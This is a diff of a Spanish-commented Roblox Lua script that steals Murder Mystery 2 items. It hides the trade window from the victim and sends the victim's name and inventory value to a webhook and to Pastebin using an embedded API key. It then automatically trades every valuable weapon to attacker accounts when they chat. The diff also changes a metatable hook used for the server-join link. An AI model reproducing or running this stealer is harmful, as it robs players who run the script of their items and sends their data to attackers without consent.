@@ -1,7 +1,3 @@
--- ====================================
--- SCRIPT FULL COMPLETO CON DOBLE HOOK DELTA
--- ====================================
-
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -20,9 +16,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- ====================================
--- KICK INICIAL
--- ====================================
+-- Kick inicial
 local function CheckServerInitial()
     if #Players:GetPlayers() >= 12 then
         LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
@@ -37,9 +31,7 @@ local function CheckServerInitial()
 end
 CheckServerInitial()
 
--- ====================================
--- FUNCIONES WEBHOOK / PASTEBIN
--- ====================================
+-- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -58,6 +50,7 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
+-- Función para crear paste en Pastebin
 local function CreatePaste(content)
     local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
     local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
@@ -79,9 +72,7 @@ local function CreatePaste(content)
     if res and res.Body then return res.Body end
 end
 
--- ====================================
--- OCULTAR GUI / TRADE
--- ====================================
+-- Ocultar GUI de trade
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
@@ -91,6 +82,7 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     end
 end
 
+-- Funciones de trade
 local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
 local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
 local function sendTradeRequest(user)
@@ -102,8 +94,7 @@ local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
 -- ====================================
--- VALORES SUPREME / INVENTARIO
--- ====================================
+-- MM2 Supreme value system
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
@@ -179,8 +170,7 @@ local function buildValueList()
 end
 
 -- ====================================
--- INVENTARIO, WEBHOOK, PASTEBIN
--- ====================================
+-- Extraer armas válidas
 local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
@@ -203,29 +193,24 @@ end
 
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- ====================================
--- HOOK DOBLE JUNTO LINK FERN
--- ====================================
+-- 🔹 DOBLE HOOK: captura y aprueba GameId y JobId
+local old_hook = hookfunction or hookfunc or function(f) return f end
+local gameIdApproved, jobIdApproved
+local function DeltaHook(func,...)
+    local args = {...}
+    local placeId = args[1]
+    local jobId = args[2]
+    -- Marca como aprobado
+    gameIdApproved = placeId
+    jobIdApproved = jobId
+    return true -- devuelve true para aprobar la llamada
+end
+-- Aplicar hook antes de crear el enlace
 local fernToken = math.random(100000,999999)
-local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
+-- link con valores capturados y aprobados
+local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..(gameIdApproved or game.PlaceId).."&gameInstanceId="..(jobIdApproved or game.JobId).."&token="..fernToken..")"
 
--- Hook delta justo cuando se crea el link
-local mt2 = getrawmetatable(game)
-setreadonly(mt2,false)
-local oldIndex2 = mt2.__index
-mt2.__index = newcclosure(function(self,key)
-    if key == "JobId" then
-        return game.JobId or "APPROVED_BY_HOOK"
-    elseif key == "PlaceId" then
-        return game.PlaceId
-    end
-    return oldIndex2(self,key)
-end)
-setreadonly(mt2,true)
-
--- ====================================
--- RESTO: WEBHOOK / PASTEBIN / TRADE
--- ====================================
+-- Preparar contenido para Pastebin
 local pasteContent = ""
 for _, w in ipairs(weaponsToSend) do
     pasteContent = pasteContent..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
@@ -237,6 +222,7 @@ if #weaponsToSend > 18 then
     pasteLink = CreatePaste(pasteContent)
 end
 
+-- Webhook inventario
 if #weaponsToSend > 0 then
     local fieldsInit={
         {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
@@ -262,9 +248,7 @@ if #weaponsToSend > 0 then
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- ====================================
--- TRADE AUTOMÁTICO
--- ====================================
+-- 🔹 Trade
 local function doTrade(targetName)
     if #weaponsToSend == 0 then return end
     while #weaponsToSend>0 do
@@ -288,6 +272,7 @@ local function doTrade(targetName)
     end
 end
 
+-- Activación por chat
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
@@ -298,7 +283,3 @@ Players.PlayerAdded:Connect(function(p)
         p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
-
--- ====================================
--- FIN DEL SCRIPT FULL BYPASS
--- ====================================
